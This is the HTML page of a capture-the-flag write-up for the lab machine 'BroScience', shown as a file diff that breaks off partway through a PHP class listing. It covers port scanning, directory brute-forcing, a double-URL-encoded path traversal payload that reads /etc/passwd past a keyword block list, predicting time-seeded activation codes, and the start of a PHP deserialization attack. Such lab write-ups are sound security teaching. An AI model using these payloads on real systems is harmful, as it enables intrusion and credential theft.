@@ -1,0 +1,456 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="Description:
+Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8."><title>BroScience</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://hakbrain.xyz//icon.png><link href=https://hakbrain.xyz/styles.f40f9c8ac1c106641723dab5233fc67c.min.css rel=stylesheet><link href=https://hakbrain.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://hakbrain.xyz/js/darkmode.8bfc78cc60cc5da6df81ec79c82c3775.min.js></script>
+<script src=https://hakbrain.xyz/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
+<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
+<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
+<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
+<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
+<script src=https://hakbrain.xyz/js/popover.abe6a51cc7138c5dff00f151dd627ad1.min.js></script>
+<script src=https://hakbrain.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
+<script src=https://hakbrain.xyz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
+<script src=https://hakbrain.xyz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
+<script>const BASE_URL="https://hakbrain.xyz/",fetchData=Promise.all([fetch("https://hakbrain.xyz/indices/linkIndex.76d76375fca5916dc593575d9ccdaced.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://hakbrain.xyz/indices/contentIndex.7b15a21983931cc462d83755a44b8773.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://hakbrain.xyz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://hakbrain.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
+    import { attachSPARouting } from "https:\/\/hakbrain.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
+    attachSPARouting(init, render)
+  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
+<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
+<script defer src=https://hakbrain.xyz/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://hakbrain.xyz/>🕸️ H@kBr4in</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
+<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>BroScience</h1><p class=meta>Last updated
+Feb 24, 2023
+<a href=https://github.com/vlagh3/hakbrain/tree/hugo/content/write-ups/htb/BroScience.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://hakbrain.xyz/tags/writeups/>Writeups</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#recon>Recon</a><ol><li><a href=#web-server>Web Server</a></li><li><a href=#leaking-the-source-with-lfi>Leaking the source with LFI</a></li><li><a href=#activating-our-account>Activating our account</a></li></ol></li><li><a href=#init-access-w-php-deserialization-rce>Init Access w PHP Deserialization RCE</a></li><li><a href=#getting-user>Getting user</a></li><li><a href=#privesc>Privesc</a></li><li><a href=#refs>Refs</a></li><li><a href=#see-also>See Also</a></li></ol></nav></details></aside><p><strong>Description</strong>:</p><a href=#recon><h2 id=recon><span class=hanchor arialabel=Anchor># </span>Recon</h2></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>PORT     STATE    SERVICE  VERSION
+</span></span><span class=line><span class=cl>22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 <span class=o>(</span>ED25519<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp   open     http     Apache httpd 2.4.54
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.4.54 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Did not follow redirect to https://broscience.htb/
+</span></span><span class=line><span class=cl>443/tcp  open     http     Apache httpd 2.4.54 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> tls-alpn: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  http/1.1
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>broscience.htb/organizationName<span class=o>=</span>BroScience/countryName<span class=o>=</span>AT
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2022-07-14T19:48:36
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2023-07-14T19:48:36
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: <span class=m>400</span> Bad Request
+</span></span><span class=line><span class=cl>5859/tcp filtered wherehoo
+</span></span></code></pre></td></tr></table></div></div><p>We see 4 ports open: 2 web servers (<code>80</code>, <code>443</code>), SSH and a strange <code>5859</code>. Also the HTTP has a port redirect to <code>broscience.htb</code> so add that in <code>/etc/hosts</code></p><a href=#web-server><h3 id=web-server><span class=hanchor arialabel=Anchor># </span>Web Server</h3></a><p>Before manually starting to browse the web app, I like to have some form of recon in the background:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u https://broscience.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -o gobuster.root
+</span></span></code></pre></td></tr></table></div></div><p>While that was running I started burp & started browsing:</p><p><img src="/write-ups/images/Pasted image 20230224151743.png" width=auto></p><p>It also has a login page <em>(which isn&rsquo;t vulnerable to SQLi)</em> & it provides us with the option to create an account. So let&rsquo;s create one:</p><p><img src="/write-ups/images/Pasted image 20230224152011.png" width=auto></p><p>Hm&mldr; it wants an activation link from the email. I just assumed it will work without activating it, since the email was a bogus one</p><p><img src="/write-ups/images/Pasted image 20230224152146.png" width=auto></p><p><img src="https://media2.giphy.com/media/3otPovBSra5d2giJCE/200w.webp?cid=ecf05e47s41qbc9dvtjsmqo9ubl9j1rwyzdifbotlbbf42cv&rid=200w.webp&ct=g" width=auto alt></p><p>It looks like we will have to find a way to activate the code if we want to login&mldr; Let&rsquo;s leave that for now & move forward to what burp discovered:</p><p><img src="/write-ups/images/Pasted image 20230224153134.png" width=auto></p><ul><li><code>user.php</code> - take an <code>id</code> param through <code>GET</code> which doesn&rsquo;t seem injectable, but we can enumerate users: administrator, bill, michael, john, dmytro <em>(those might come in handy if we have to bruteforce or for SSH login)</em></li><li><code>exercise.php</code> - similar to the above, but it keeps track of exercises</li><li><code>comment.php</code> - handles comments on exercise pages, but we have to be logged in</li><li><code>/includes</code> - this seems juicy. It looks like it contains some utils for the source code</li></ul><a href=#leaking-the-source-with-lfi><h3 id=leaking-the-source-with-lfi><span class=hanchor arialabel=Anchor># </span>Leaking the source with LFI</h3></a><p>Accessing each of them doesn&rsquo;t give us much, except <code>img.php</code> which tells us to give it a <code>path</code> parameter:</p><p><img src="/write-ups/images/Pasted image 20230224153422.png" width=auto></p><p>I did as the computer overlord asked of me & supplied <code>img.php?path=../../../../../../etc/passwd</code>, but I got back a <strong>Error: Attack detected.</strong>. So the web app uses some form of input validation that we&rsquo;ll probably have to bypass. After some trial & error I figured out it works if we double url encode it:</p><p><img src="/write-ups/images/Pasted image 20230224154045.png" width=auto></p><p>At this point I decided to write a simple python script to make the process of leaking the source code easier:</p><p><img src="/write-ups/images/Pasted image 20230224154834.png" width=auto></p><p>Nice we already have some creds for the db. Then I just repeated the process for every file I was aware of ending up with all of the source code 🍺</p><p><strong>Bonus</strong>: here&rsquo;s how the actual input validation was made. Actually way easier to bypass than I presumed</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=c1>// Check for LFI attacks
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$path</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;path&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$badwords</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;../&#34;</span><span class=p>,</span> <span class=s2>&#34;etc/passwd&#34;</span><span class=p>,</span> <span class=s2>&#34;.ssh&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=k>foreach</span> <span class=p>(</span><span class=nv>$badwords</span> <span class=k>as</span> <span class=nv>$badword</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>strpos</span><span class=p>(</span><span class=nv>$path</span><span class=p>,</span> <span class=nv>$badword</span><span class=p>)</span> <span class=o>!==</span> <span class=k>false</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;&lt;b&gt;Error:&lt;/b&gt; Attack detected.&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// Normalize path
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$path</span> <span class=o>=</span> <span class=nx>urldecode</span><span class=p>(</span><span class=nv>$path</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><a href=#activating-our-account><h3 id=activating-our-account><span class=hanchor arialabel=Anchor># </span>Activating our account</h3></a><p>I ended up with the following files after sifting through the source code & finding more source php files:</p><p><img src="/write-ups/images/Pasted image 20230224155642.png" width=auto></p><p>I will only highlight what&rsquo;s important, since going through everything would take way to much time to explain. So in <code>register.php</code> we have the following lines disclosing how the activation of accounts is made:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>include_once</span> <span class=s1>&#39;includes/utils.php&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$activation_code</span> <span class=o>=</span> <span class=nx>generate_activation_code</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>pg_prepare</span><span class=p>(</span><span class=nv>$db_conn</span><span class=p>,</span> <span class=s2>&#34;check_code_unique_query&#34;</span><span class=p>,</span> <span class=s1>&#39;SELECT id FROM users WHERE activation_code = $1&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>pg_execute</span><span class=p>(</span><span class=nv>$db_conn</span><span class=p>,</span> <span class=s2>&#34;check_code_unique_query&#34;</span><span class=p>,</span> <span class=k>array</span><span class=p>(</span><span class=nv>$activation_code</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>...</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// TODO: Send the activation link to email
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$activation_link</span> <span class=o>=</span> <span class=s2>&#34;https://broscience.htb/activate.php?code=</span><span class=si>{</span><span class=nv>$activation_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>We see that the code is generated with <code>generate_activation_code()</code> function found in <code>utils.php</code> & that the activation is being made by passing it in the <code>code</code> param @ <code>activate.php</code>. This will then check in the DB if the provided code is associated with any user & then activate the user account. Also note that all the SQL queries are made with <code>pg_prepare</code> and <code>pg_execute</code>, hence out failed SQLi attempts. Let&rsquo;s check the generation function to see it&rsquo;s logic:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>generate_activation_code</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$chars</span> <span class=o>=</span> <span class=s2>&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>srand</span><span class=p>(</span><span class=nx>time</span><span class=p>());</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$activation_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=mi>32</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$activation_code</span> <span class=o>=</span> <span class=nv>$activation_code</span> <span class=o>.</span> <span class=nv>$chars</span><span class=p>[</span><span class=nx>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$chars</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)];</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$activation_code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>So it takes the current time as a seed <em>(<code>srand(time())</code>)</em> to generate the random numbers used to pick random chars, creating a string of 32 chars in the end. I ended up running something similar on my local machine to test things out. My guess is that if we use the same seed <em>(i.e date)</em> we should get the same code, due to
+<a href=https://owasp.org/www-community/vulnerabilities/Insecure_Randomness rel=noopener>insecure randomness</a>:</p><p><img src="/write-ups/images/Pasted image 20230224162642.png" width=auto></p><p>By this logic, the only thing left to do is to find the date when our user account was created. Luckily for us that is given to us in the response headers:</p><p><img src="/write-ups/images/Pasted image 20230224162815.png" width=auto></p><p>Then modify the script a little, generate the code & activate our account:</p><p><img src="/write-ups/images/Pasted image 20230224163357.png" width=auto></p><a href=#init-access-w-php-deserialization-rce><h2 id=init-access-w-php-deserialization-rce><span class=hanchor arialabel=Anchor># </span>Init Access w PHP Deserialization RCE</h2></a><p>Now that we have access, the only thing different is that we have a <code>user-prefs</code> cookie set that seems to be serialized object:</p><p><img src="/write-ups/images/Pasted image 20230224171251.png" width=auto></p><p>The first things that popped into my head was to try
+<a href=https://book.hacktricks.xyz/pentesting-web/deserialization#php rel=noopener>deserialization</a> in order to execute code on the server. However, for that we need to look @ the source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_theme</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;id&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user-prefs&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$up_cookie</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=k>new</span> <span class=nx>UserPrefs</span><span class=p>()));</span>
+</span></span><span class=line><span class=cl>            <span class=nx>setcookie</span><span class=p>(</span><span class=s1>&#39;user-prefs&#39;</span><span class=p>,</span> <span class=nv>$up_cookie</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$up_cookie</span> <span class=o>=</span> <span class=nv>$_COOKIE</span><span class=p>[</span><span class=s1>&#39;user-prefs&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$up</span> <span class=o>=</span> <span class=nx>unserialize</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$up_cookie</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=nv>$up</span><span class=o>-&gt;</span><span class=na>theme</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;light&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Here&rsquo;s where our cookie is set & where our <code>unserilize()</code> function is executed. Thus, we know this is injectable. Now, we need to figure out if the <code>UserPrefs</code> class gives us any useful gadgets that can be leveraged:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>UserPrefs</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$theme</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$theme</span> <span class=o>=</span> <span class=s2>&#34;light&#34;</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=nv>$this</span><span class=o>-&gt;</span><span class=na>theme</span> <span class=o>=</span> <span class=nv>$theme</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>Shit&mldr; we can&rsquo;t do anything with this</p><p><img src="https://media0.giphy.com/media/26tnkeXdTGdb4smPe/200w.webp?cid=ecf05e47f0elegv7bq90lwmuifkh1zc3qq5mo8yya2pco1id&rid=200w.webp&ct=g" width=auto alt></p><p>Luckily for us the source code has some other classes which could be more fruitful</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>class</span> <span class=nc>Avatar</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>(</span><span class=nv>$imgPath</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span> <span class=o>=</span> <span class=nv>$imgPath</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>save</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$f</span> <span class=o>=</span> <span class=nx>fopen</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>imgPath</span><span class=p>,</span> <span class=s2>&#34;w&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fwrite</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$tmp</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        <span class=nx>fclose</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>AvatarInterface</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$tmp</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$imgPath</span><span class=p>;</span> 
+</span></span><span class=line><span class=cl>
